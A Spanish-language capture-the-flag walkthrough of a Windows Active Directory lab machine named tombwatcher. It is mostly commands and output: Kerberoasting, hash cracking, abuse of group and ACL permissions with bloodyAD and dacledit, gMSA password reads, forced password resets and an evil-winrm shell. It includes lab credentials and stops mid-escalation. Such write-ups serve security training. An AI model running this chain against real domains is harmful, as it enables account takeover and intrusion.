# Resolución maquina tombwatcher

**Autor:** PepeMaquina  
**Fecha:** 24 de septiembre de 2025  
**Dificultad:** Medio  
**Sistema Operativo:** Windows  
**Tags:** AD, BloodHound, ADCS  

---

## Imagen de la Máquina

![tombwatcher.JPG](data:image/jpeg;base64,/9j/4AAQSkZJRgABAQEAYABgAAD/4QL0RXhpZgAATU0AKgAAAAgABAE7AAIAAAAOAAABSodpAAQAAAABAAABWJydAAEAAAAcAAAC0OocAAcAAAEMAAAAPgAAAAAc6gAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAASm9zZSBGZXJuYW5kbwAABZADAAIAAAAUAAACppAEAAIAAAAUAAACupKRAAIAAAADNTkAAJKSAAIAAAADNTkAAOocAAcAAAEMAAABmgAAAAAc6gAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMjAyNTowOToyNSAxNjo1Mjo1NAAyMDI1OjA5OjI1IDE2OjUyOjU0AAAASgBvAHMAZQAgAEYAZQByAG4AYQBuAGQAbwAAAP/hBCBodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvADw/eHBhY2tldCBiZWdpbj0n77u/JyBpZD0nVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkJz8+DQo8eDp4bXBtZXRhIHhtbG5zOng9ImFkb2JlOm5zOm1ldGEvIj48cmRmOlJERiB4bWxuczpyZGY9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkvMDIvMjItcmRmLXN5bnRheC1ucyMiPjxyZGY6RGVzY3JpcHRpb24gcmRmOmFib3V0PSJ1dWlkOmZhZjViZGQ1LWJhM2QtMTFkYS1hZDMxLWQzM2Q3NTE4MmYxYiIgeG1sbnM6ZGM9Imh0dHA6Ly9wdXJsLm9yZy9kYy9lbGVtZW50cy8xLjEvIi8+PHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9InV1aWQ6ZmFmNWJkZDUtYmEzZC0xMWRhLWFkMzEtZDMzZDc1MTgyZjFiIiB4bWxuczp4bXA9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC8iPjx4bXA6Q3JlYXRlRGF0ZT4yMDI1LTA5LTI1VDE2OjUyOjU0LjU5MTwveG1wOkNyZWF0ZURhdGU+PC9yZGY6RGVzY3JpcHRpb24+PHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9InV1aWQ6ZmFmNWJkZDUtYmEzZC0xMWRhLWFkMzEtZDMzZDc1MTgyZjFiIiB4bWxuczpkYz0iaHR0cDovL3B1cmwub3JnL2RjL2VsZW1lbnRzLzEuMS8iPjxkYzpjcmVhdG9yPjxyZGY6U2VxIHhtbG5zOnJkZj0iaHR0cDovL3d3dy53My5vcmcvMTk5OS8wMi8yMi1yZGYtc3ludGF4LW5zIyI+PHJkZjpsaT5Kb3NlIEZlcm5hbmRvPC9yZGY6bGk+PC9yZGY6U2VxPg0KCQkJPC9kYzpjcmVhdG9yPjwvcmRmOkRlc2NyaXB0aW9uPjwvcmRmOlJERj48L3g6eG1wbWV0YT4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg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)

*Imagen: tombwatcher.JPG*

## Reconocimiento Inicial

### Escaneo de Puertos
Comenzamos con un escaneo completo de nmap para identificar servicios expuestos:
~~~ bash
sudo nmap -p- --open -sS -vvv --min-rate 5000 -n -Pn 10.10.11.72 -oG networked
~~~
Luego queda realizar un escaneo detallado de puertos abiertos:
~~~ bash
sudo nmap -sCV -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49666,49691,49692,49694,49713,49729,49744 10.10.11.72 -oN targeted
~~~
### Enumeración de Servicios
| Puerto | Servicio      | Versión                                                                                            |
| ------ | ------------- | -------------------------------------------------------------------------------------------------- |
| 53     | domain        | Simple DNS Plus                                                                                    |
| 80     | HTTP          | Microsoft IIS httpd 10.0                                                                           |
| 88     | kerberos-sec  | Microsoft Windows Kerberos (server time: 2025-09-24 22:39:48Z)                                     |
| 135    | msrpc         | Microsoft Windows RPC                                                                              |
| 139    | netbios-ssn   | Microsoft Windows netbios-ssn                                                                      |
| 389    | ldap          | Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name) |
| 445    | microsoft-ds? |                                                                                                    |
| 464    | kpasswd5      |                                                                                                    |
| 593    | ncacn_http    | Microsoft Windows RPC over HTTP 1.0                                                                |
| 636    | ssl/ldap      | Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name) |
| 3268   | ldap          | Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name) |
| 3269   | ssl/ldap      | Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name) |
| 5985   | winrm         | Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)                                                            |
### Enumeracion de nombre del dominio
En este apartado, se realizó la enumeración del nombre de dominio y host con la herramienta netexec y las credenciales entregadas
~~~ bash
sudo netexec smb 10.10.11.72 -u 'henry' -p 'H3nry_987TGV!'                                          SMB         10.10.11.72     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False)                                                                                                                                                      SMB         10.10.11.72     445    DC01             [+] tombwatcher.htb\henry:H3nry_987TGV!
~~~
Con ello ya guardamos la ip y el dominio con su respectivo host
~~~ bash
cat /etc/hosts
127.0.0.1       localhost
10.10.11.72 tombwatcher.htb dc01.tombwatcher.htb dc01
~~~

### Reconocimiento Web
### Enumeración de directorios

~~~
feroxbuster -u http://tombeatcher.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -d 0 -t 5 -o fuzz -k -x asp,aspx
~~~
Pero lastimosamente no se pudo encontrar nada respecto a directorios, por lo que podria ser una pista falsa para la enumeración que lo lleva a nada

---

## Enumeración con BloodHound

### Enumeración del dominio con BloodHound y credenciales validas
Como bien se entregaron un par de credenciales validas para la maquina, se las usara para enumerar el dominio, empleandi herramientas como bloodhoundpython
~~~bash
bloodhound-python -u henry -p 'H3nry_987TGV!' -c All -d tombwatcher.htb -ns 10.10.11.72
~~~
### Jugando con BloodHound
Al subir los archivos a bloodhound se puede ver que henry tiene permisos sobre alfred
![[1.jpg]]
Esto da a lugar a un ataque de kerberoasting, por lo que se usa impacket para dicho proposito, capturando su hash y descifrandolo usando john the ripper
~~~bash
python3 targetedKerberoast.py -v -d 'tombwatcher.htb' -u 'henry' -p 'H3nry_987TGV!'
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
VERBOSE] SPN added successfully for (Alfred)
[+] Printing hash for (Alfred)
$krb5tgs$23$*Alfred$TOMBWATCHER.HTB$tombwatcher.htb/Alfred*$51a1a74d<SNIP>fbc3af
[VERBOSE] SPN removed successfully for (Alfred)
~~~
Con el hash descubierto, solo queda pasarlo a un archivo y descifrarlo con john
~~~bash
sudo john hash_alfred --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
----------       (?)     
1g 0:00:00:00 DONE (2025-09-26 05:01) 33.33g/s 34133p/s 34133c/s 34133C/s 123456..bethany
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
~~~
Continuando con bloodhound, con alfred se puede ver que tiene permisos Generic All sobre un grupo, asi que seria conveniente añadirse a dicho grupo y heredar sus privilegios, esto se hará con bloodyAD (herramienta poderosa para AD)
![[2.jpg]]
~~~bash
bloodyAD -d tombwatcher.htb --host 10.10.11.72 -u alfred -p '&lt;MetaContraseña&gt;' add groupMember 'INFRASTRUCTURE' alfred</code></pre><pre><code>[+] alfred added to INFRASTRUCTURE
~~~
Con el usuario añadido, se puede ver los privilegios del grupo y muestra que puede ver credenciales GMSA de otro usuario
![[3.jpg]]
~~~ bash
sudo netexec ldap 10.10.11.72 -u alfred -p '<MetaContraseña>' --gmsa             
SMB         10.10.11.72     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False)                                                                                                                                                    
LDAPS       10.10.11.72     636    DC01             [+] tombwatcher.htb\alfred:basketball
LDAPS       10.10.11.72     636    DC01             [*] Getting GMSA Passwords
LDAPS       10.10.11.72     636    DC01             Account: ansible_dev$         NTLM: <SNIP>
~~~
Con este usuario se puede ver que tiene permisos de cambio de contraseña sobre el usuario sam
![[4.jpg]]
~~~bash
bloodyAD -u "ansible_dev$" -p :4f&lt;SNIP&gt;f4 -d "tombwatcher.htb" --host 10.10.11.72 set password "sam" 'password123!'
[+] Password changed successfully!
~~~
Continuando la busqueda en bloodhound, se pudo ver que el usuario sam tiene permisos WriteOwner sobre john por lo que se le puede añadir mas permisos como generic all y luego cambiar credenciales
![[5.jpg]]
~~~ bash
dacledit.py -action 'write' -rights 'FullControl' -principal 'sam' -target 'john' 'tombwatcher.htb'/'sam':'password123!'
/home/kali/.local/bin/dacledit.py:101: SyntaxWarning: invalid escape sequence '\V'
<  'S-1-5-83-0': 'NT VIRTUAL MACHINE\Virtual Machines',
/home/kali/.local/bin/dacledit.py:110: SyntaxWarning: invalid escape sequence '\P'
  'S-1-5-32-554': 'BUILTIN\Pre-Windows 2000 Compatible Access',
/home/kali/.local/bin/dacledit.py:111: SyntaxWarning: invalid escape sequence '\R'
  'S-1-5-32-555': 'BUILTIN\Remote Desktop Users',
/home/kali/.local/bin/dacledit.py:112: SyntaxWarning: invalid escape sequence '\I'
  'S-1-5-32-557': 'BUILTIN\Incoming Forest Trust Builders',
/home/kali/.local/bin/dacledit.py:114: SyntaxWarning: invalid escape sequence '\P'
 'S-1-5-32-558': 'BUILTIN\Performance Monitor Users',
/home/kali/.local/bin/dacledit.py:115: SyntaxWarning: invalid escape sequence '\P'
  'S-1-5-32-559': 'BUILTIN\Performance Log Users',
/home/kali/.local/bin/dacledit.py:116: SyntaxWarning: invalid escape sequence '\W'
  'S-1-5-32-560': 'BUILTIN\Windows Authorization Access Group',
/home/kali/.local/bin/dacledit.py:117: SyntaxWarning: invalid escape sequence '\T'
  'S-1-5-32-561': 'BUILTIN\Terminal Server License Servers',
/home/kali/.local/bin/dacledit.py:118: SyntaxWarning: invalid escape sequence '\D'
  'S-1-5-32-562': 'BUILTIN\Distributed COM Users',
/home/kali/.local/bin/dacledit.py:119: SyntaxWarning: invalid escape sequence '\C'
  'S-1-5-32-569': 'BUILTIN\Cryptographic Operators',
/home/kali/.local/bin/dacledit.py:120: SyntaxWarning: invalid escape sequence '\E'
  'S-1-5-32-573': 'BUILTIN\Event Log Readers',
/home/kali/.local/bin/dacledit.py:121: SyntaxWarning: invalid escape sequence '\C'
  'S-1-5-32-574': 'BUILTIN\Certificate Service DCOM Access',
/home/kali/.local/bin/dacledit.py:122: SyntaxWarning: invalid escape sequence '\R'
'S-1-5-32-575': 'BUILTIN\RDS Remote Access Servers',
/home/kali/.local/bin/dacledit.py:123: SyntaxWarning: invalid escape sequence '\R'
  'S-1-5-32-576': 'BUILTIN\RDS Endpoint Servers',>
/home/kali/.local/bin/dacledit.py:124: SyntaxWarning: invalid escape sequence '\R'
<  'S-1-5-32-577': 'BUILTIN\RDS Management Servers',
home/kali/.local/bin/dacledit.py:125: SyntaxWarning: invalid escape sequence '\H'
  'S-1-5-32-578': 'BUILTIN\Hyper-V Administrators',
/home/kali/.local/bin/dacledit.py:126: SyntaxWarning: invalid escape sequence '\A'
 'S-1-5-32-579': 'BUILTIN\Access Control Assistance Operators',
/home/kali/.local/bin/dacledit.py:127: SyntaxWarning: invalid escape sequence '\R'
'S-1-5-32-580': 'BUILTIN\Remote Management Users',
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
[*] DACL backed up to dacledit-20250924-204452.bak
[*] DACL modified successfully!

net rpc password "john" 'test123!' -U "tombwatcher.htb"/"sam"%'password123!' -S "tombwatcher.htb"  
~~~

---

## User Flag

> **Valor de la Flag:** `<Averiguelo usted mismo>`

### User Flag
Con el cambio de credenciales del usuario john ya se puede probar si este usuario puede ingresar a una interfaz como winrm y efectivamente tiene acceso
~~~ 
evil-winrm -i 10.10.11.72 -u john -p 'test123!'                                                                         
Evil-WinRM shell v3.7
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Info: Establishing connection to remote endpoint
Evil-WinRM PS C:\Users\john\Documents>
~~~
Ahora la flag se encuentra facilmente en el directorio desktop
~~~
Evil-WinRM PS C:\Users\john\Documents> cd ..
Evil-WinRM PS C:\Users\john> cd desktop
Evil-WinRM PS C:\Users\john\desktop> type user.txt
<SAQUE SU FLAG>
~~~

---

## Escalada de Privilegios

### Escalada de Privilegios
En este punto, se vio algo raro revisando bloodhound, se ve que el usuario john tiene permisos sobre una unidad organizacional pero al revisar esta no tienen ningun objeto creado, por lo que se piensa que puede ser posible que haya tenido objetos asociados pero se hayan eliminado
![[6.jpg]]
Entonces primero tomamos mas control sobre la unidad organizacional
~~~ bash
dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal 'john' -target-dn 'OU=ADCS,DC=TOMBWATCHER,DC=HTB' 'tombwatcher.htb'/'john':'test123!'
/home/kali/.local/bin/dacledit.py:101: SyntaxWarning: invalid escape sequence '\V'
 'S-1-5-83-0': 'NT VIRTUAL MACHINE\Virtual Machines',
/home/kali/.local/bin/dacledit.py:110: SyntaxWarning: invalid escape sequence '\P'
 'S-1-5-32-554': 'BUILTIN\Pre-Windows 2000 Compatible Access',
/home/kali/.local/bin/dacledit.py:111: SyntaxWarning: invalid escape sequence '\R'
 'S-1-5-32-555': 'BUILTIN\Remote Desktop Users',
/home/kali/.local/bin/dacledit.py:112: SyntaxWarning: invalid escape sequence '\I'
 'S-1-5-32-557': 'BUILTIN\Incoming Forest Trust Builders',
/home/kali/.local/bin/dacledit.py:114: SyntaxWarning: invalid escape sequence '\P'
 'S-1-5-32-558': 'BUILTIN\Performance Monitor Users',
/home/kali/.local/bin/dacledit.py:115: SyntaxWarning: invalid escape sequence '\P'
 'S-1-5-32-559': 'BUILTIN\Performance Log Users'
/home/kali/.local/bin/dacledit.py:116: SyntaxWarning: invalid escape sequence '\W'
 'S-1-5-32-560': 'BUILTIN\Windows Authorization Access Group',
/home/kali/.local/bin/dacledit.py:117: SyntaxWarning: invalid escape sequence '\T'
 'S-1-5-32-561': 'BUILTIN\Terminal Server License Servers',
/home/kali/.local/bin/dacledit.py:118: SyntaxWarning: invalid escape sequence '\D'
 'S-1-5-32-562': 'BUILTIN\Distributed COM Users',
/home/kali/.local/bin/dacledit.py:119: SyntaxWarning: invalid escape sequence '\C'
 'S-1-5-32-569': 'BUILTIN\Cryptographic Operators',
/home/kali/.local/bin/dacledit.py:120: SyntaxWarning: invalid escape sequence '\E'
 'S-1-5-32-573': 'BUILTIN\Event Log Readers',
/home/kali/.local/bin/dacledit.py:121: SyntaxWarning: invalid escape sequence '\C'
 'S-1-5-32-574': 'BUILTIN\Certificate Service DCOM Access',
/home/kali/.local/bin/dacledit.py:122: SyntaxWarning: invalid escape sequence '\R'
 'S-1-5-32-575': 'BUILTIN\RDS Remote Access Servers',
/home/kali/.local/bin/dacledit.py:123: SyntaxWarning: invalid escape sequence '\R'
 'S-1-5-32-576': 'BUILTIN\RDS Endpoint Servers',
/home/kali/.local/bin/dacledit.py:124: SyntaxWarning: invalid escape sequence '\R'
 'S-1-5-32-577': 'BUILTIN\RDS Management Servers',
/home/kali/.local/bin/dacledit.py:125: SyntaxWarning: invalid escape sequence '\H'
 'S-1-5-32-578': 'BUILTIN\Hyper-V Administrators',
/home/kali/.local/bin/dacledit.py:126: SyntaxWarning: invalid escape sequence '\A'
 'S-1-5-32-579': 'BUILTIN\Access Control Assistance Operators',
